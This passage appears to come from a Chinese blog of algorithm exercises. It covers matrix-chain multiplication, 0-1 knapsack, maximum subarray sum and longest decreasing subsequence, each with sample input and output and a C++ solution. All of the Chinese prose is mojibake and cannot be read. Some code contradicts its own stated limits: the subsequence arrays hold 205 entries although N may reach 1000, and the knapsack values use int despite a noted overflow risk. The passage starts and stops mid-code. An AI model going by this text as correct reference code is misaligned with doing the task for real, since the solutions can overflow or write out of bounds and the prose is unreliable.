class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">int</span> lenb = <span class="built_in">strlen</span>(b);</span><br><span class="line">solve(lena,lenb);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çŸ©é˜µè¿ä¹˜"><a href="#çŸ©é˜µè¿ä¹˜" class="headerlink" title="çŸ©é˜µè¿ä¹˜"></a>çŸ©é˜µè¿ä¹˜</h3><h4 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ç»™å®šnä¸ªçŸ©é˜µ{A1,A2,â€¦,An}ï¼ŒåŠmä¸ªçŸ©é˜µè¿ä¹˜çš„è¡¨è¾¾å¼ï¼Œåˆ¤æ–­æ¯ä¸ªçŸ©é˜µè¿ä¹˜è¡¨è¾¾å¼æ˜¯å¦æ»¡è¶³çŸ©é˜µä¹˜æ³•æ³•åˆ™ï¼Œå¦‚æœæ»¡è¶³ï¼Œåˆ™è®¡ç®—çŸ©é˜µçš„æœ€å°è¿ä¹˜æ¬¡æ•°ï¼Œå¦‚æœä¸æ»¡è¶³è¾“å‡ºâ€œMengMengDaâ€œã€‚</p><h5 id="è¾“å…¥-6"><a href="#è¾“å…¥-6" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥æ•°æ®ç”±å¤šç»„æ•°æ®ç»„æˆï¼ˆä¸è¶…è¿‡10ç»„æ ·ä¾‹ï¼‰ã€‚æ¯ç»„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š<br>ç¬¬ä¸€è¡Œæ˜¯2ä¸ªæ•´æ•°n (1â‰¤nâ‰¤26)å’Œm(1â‰¤mâ‰¤3)ï¼Œè¡¨ç¤ºçŸ©é˜µçš„ä¸ªæ•°ã€‚<br>æ¥ä¸‹æ¥nè¡Œï¼Œæ¯è¡Œæœ‰ä¸€ä¸ªå¤§å†™å­—æ¯ï¼Œè¡¨ç¤ºçŸ©é˜µçš„åå­—ï¼Œåé¢æœ‰ä¸¤ä¸ªæ•´æ•°rå’Œcï¼Œåˆ†åˆ«è¡¨ç¤ºè¯¥çŸ©é˜µçš„è¡Œæ•°å’Œåˆ—æ•°ï¼Œå…¶ä¸­1 &lt; r, c<br>ç¬¬n+1è¡Œåˆ°ç¬¬n+mè¡Œï¼Œæ¯è¡Œæ˜¯ä¸€ä¸ªçŸ©é˜µè¿ä¹˜çš„è¡¨è¾¾å¼(2&lt;=çŸ©é˜µä¸ªæ•°&lt;=100)ã€‚</p><h5 id="è¾“å‡º-6"><a href="#è¾“å‡º-6" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹äºæ¯ä¸ªçŸ©é˜µè¿ä¹˜è¡¨è¾¾å¼ï¼Œå¦‚æœè¿ç®—ä¸æ»¡è¶³çŸ©é˜µä¹˜æ³•æ³•åˆ™çš„æƒ…å†µï¼ˆå³å·¦çŸ©é˜µåˆ—æ•°ä¸å³çŸ©é˜µçš„è¡Œæ•°ä¸åŒï¼‰ï¼Œåˆ™è¾“å‡ºâ€œMengMengDaâ€ï¼Œå¦åˆ™è¾“å‡ºæœ€å°çŸ©é˜µè¿ä¹˜æ¬¡æ•°ã€‚</p><p>æ•°æ®ä¿è¯ç»“æœä¸è¶…è¿‡1e9ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-6"><a href="#æ ·ä¾‹è¾“å…¥-6" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-6"><a href="#æ ·ä¾‹è¾“å‡º-6" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> p[],<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt;=len;i++) m[i][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=len;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len-r+<span class="number">1</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> j = i + r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j] + p[i<span class="number">-1</span>]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k =i+<span class="number">1</span> ;k &lt; j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[k]*p[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][len]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,l;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)&#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>,Matrix&gt;my_map;</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="keyword">int</span> j,k;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;j&gt;&gt;k;</span><br><span class="line">Matrix tmp ;</span><br><span class="line">tmp.r = j;</span><br><span class="line">tmp.c = k;</span><br><span class="line">my_map[a] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> words[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; l; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;words;</span><br><span class="line"><span class="keyword">int</span> lenw = <span class="built_in">strlen</span>(words);</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">0</span>] = my_map[words[<span class="number">0</span>]].r;</span><br><span class="line">p[<span class="number">1</span>] = my_map[words[<span class="number">0</span>]].c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>; j &lt; lenw;j++)&#123; <span class="comment">//æ³¨æ„ </span></span><br><span class="line"><span class="keyword">if</span>(my_map[words[j]].r != my_map[words[j<span class="number">-1</span>]].c)&#123;</span><br><span class="line">flag  =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p[j+<span class="number">1</span>] = my_map[words[j]].c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">"MengMengDa"</span>);</span><br><span class="line"><span class="keyword">else</span> solve(p,lenw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01èƒŒåŒ…-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„"><a href="#01èƒŒåŒ…-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„" class="headerlink" title="01èƒŒåŒ…(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)"></a>01èƒŒåŒ…(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)</h3><h4 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>å·²çŸ¥æœ‰Nç§ç‰©å“å’Œä¸€ä¸ªå¯å®¹çº³Cé‡é‡çš„èƒŒåŒ…ã€‚æ¯ç§ç‰©å“içš„é‡é‡ä¸ºWiï¼Œä»·å€¼ä¸ºPiã€‚é‚£ä¹ˆï¼Œé‡‡ç”¨æ€æ ·çš„è£…åŒ…æ–¹æ³•æ‰ä¼šä½¿è£…å…¥èƒŒåŒ…ç‰©å“çš„æ€»ä»·å€¼æœ€å¤§ã€‚</p><h5 id="è¾“å…¥-7"><a href="#è¾“å…¥-7" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°T(1&lt;=T&lt;=10)ï¼Œä»£è¡¨æµ‹è¯•æ•°æ®ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥æœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®ç¬¬ä¸€è¡Œä¸ºèƒŒåŒ…çš„é‡é‡C(C&lt;10000)å’Œç‰©å“ä¸ªæ•°N(N&lt;1000)ã€‚æ¥ä¸‹æ¥çš„Nè¡Œåˆ†åˆ«ä¸ºç‰©å“çš„é‡é‡cost(1&lt;=cost&lt;=100)å’Œä»·å€¼val(1&lt;=val&lt;=3000000)ã€‚ï¼ˆæ³¨æ„ï¼šç»“æœå¯èƒ½è¶…è¿‡intèŒƒå›´ï¼‰</p><h5 id="è¾“å‡º-7"><a href="#è¾“å‡º-7" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹æ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºå…¶å¯¹åº”çš„æ‰€è£…ç‰©å“çš„æœ€å¤§ä»·å€¼ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-7"><a href="#æ ·ä¾‹è¾“å…¥-7" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-7"><a href="#æ ·ä¾‹è¾“å‡º-7" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;,v[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1005</span>][<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//æ ‡è®°ä½œç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ„é€ æœ€ä¼˜è§£*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> cost)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i&gt;<span class="number">1</span>; i--)&#123;   <span class="comment">//æ³¨æ„è¿™é‡Œå¯èƒ½ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span>( m[i][cost] == m[i<span class="number">-1</span>][cost] ) x[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x[i]= <span class="number">1</span>;</span><br><span class="line">            cost -=w[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;1&lt;&lt;endl;</span></span><br><span class="line">    x[<span class="number">1</span>] = m[<span class="number">1</span>][cost]?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">            <span class="keyword">int</span> c,n;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span> ; i&lt;= n;i++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>;j&lt;= c;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j &gt;= w[i]) m[i][j] = max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+v[i]);</span><br><span class="line">                    <span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;m[n][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">         <span class="comment">//   output(n,c);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§å­æ®µå’Œ"><a href="#æœ€å¤§å­æ®µå’Œ" class="headerlink" title="æœ€å¤§å­æ®µå’Œ"></a>æœ€å¤§å­æ®µå’Œ</h3><h4 id="é¢˜ç›®æè¿°-8"><a href="#é¢˜ç›®æè¿°-8" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ç»™å®šnä¸ªæ•´æ•°ç»„æˆçš„åºåˆ—a1,a2,â€¦an, æ±‚å­æ®µå’Œai+ai+1+â€¦+ajï¼ˆå­æ®µå¯ä¸ºç©ºé›†ï¼‰çš„æœ€å¤§å€¼ã€‚</p><h5 id="è¾“å…¥-8"><a href="#è¾“å…¥-8" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°T(1&lt;=T&lt;=20)ï¼Œä»£è¡¨æµ‹è¯•æ•°æ®ä¸ªæ•°ã€‚</p><p>æ¯ç»„æµ‹è¯•æ•°æ®ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ•´æ•°nï¼Œä»£è¡¨æœ‰nä¸ªæ•´æ•°(1&lt;=n&lt;=10000)ã€‚</p><p>æ¥ä¸‹æ¥ä¸€è¡Œæœ‰nä¸ªæ•°x(-1000&lt;=x&lt;=1000)ã€‚</p><h5 id="è¾“å‡º-8"><a href="#è¾“å‡º-8" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>è¾“å‡ºå…¶å¯¹åº”çš„æœ€å¤§å­æ®µå’Œã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-8"><a href="#æ ·ä¾‹è¾“å…¥-8" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-8"><a href="#æ ·ä¾‹è¾“å‡º-8" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt; len ;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        k += a[i];</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        k = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &gt; sum) sum = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n ;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        solve(n);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚æ•°ç»„çš„æœ€é•¿é€’å‡å­åºåˆ—"><a href="#æ±‚æ•°ç»„çš„æœ€é•¿é€’å‡å­åºåˆ—" class="headerlink" title="æ±‚æ•°ç»„çš„æœ€é•¿é€’å‡å­åºåˆ—"></a>æ±‚æ•°ç»„çš„æœ€é•¿é€’å‡å­åºåˆ—</h3><h4 id="é¢˜ç›®æè¿°-9"><a href="#é¢˜ç›®æè¿°-9" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ç»™å®šä¸€ä¸ªæ•´æ•°åºåˆ—ï¼Œè¾“å‡ºå®ƒçš„æœ€é•¿é€’å‡ï¼ˆæ³¨æ„ä¸æ˜¯â€œä¸é€’å¢â€ï¼‰å­åºåˆ—ã€‚</p><h5 id="è¾“å…¥-9"><a href="#è¾“å…¥-9" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥åŒ…æ‹¬ä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…æ‹¬ä¸€ä¸ªæ­£æ•´æ•°Nï¼ˆN&lt;=1000ï¼‰ï¼Œè¡¨ç¤ºè¾“å…¥çš„æ•´æ•°åºåˆ—çš„é•¿åº¦ã€‚ç¬¬äºŒè¡ŒåŒ…æ‹¬ç”¨ç©ºæ ¼åˆ†éš”å¼€çš„Nä¸ªæ•´æ•°ï¼Œæ•´æ•°èŒƒå›´åŒºé—´ä¸º[-30000,30000]ã€‚</p><h5 id="è¾“å‡º-9"><a href="#è¾“å‡º-9" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>è¾“å‡ºæœ€é•¿é€’å‡å­åºåˆ—ï¼Œæ•°å­—ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-9"><a href="#æ ·ä¾‹è¾“å…¥-9" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-9"><a href="#æ ·ä¾‹è¾“å‡º-9" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> roud[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> maxc;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x)&#123;</span><br><span class="line">output(roud[x]);</span><br><span class="line"><span class="keyword">if</span>(maxc != x) <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span> ; i&lt;= N; i++) <span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= N ; i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line">roud[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(num[j] &gt; num[i] &amp;&amp; dp[i] &lt; dp[j] +<span class="number">1</span> )&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span> ;</span><br><span class="line">roud[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dp[i] &gt; 